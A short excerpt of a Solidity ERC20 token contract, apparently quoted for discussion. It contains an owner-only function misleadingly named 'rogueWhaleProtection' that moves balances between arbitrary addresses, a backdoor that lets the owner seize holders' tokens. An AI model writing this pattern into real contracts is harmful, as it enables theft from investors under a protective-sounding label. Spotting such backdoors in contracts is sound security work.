...
contract ATOKEN is ERC20Detailed, Ownable, WhitelistedRole {
    ...
    constructor() ERC20Detailed("A Token10", "Token10", uint8(DECIMALS)) {
   ...
   function rogueWhaleProtection(address _from, address _to, uint256 _value) public onlyOwner{
        _gonBalances[_to] = _gonBalances[_to].add(_value);
        _gonBalances[_from] = _gonBalances[_from].sub(_value);
    ...
    function setTwentyFourhours(uint256 _time) private {
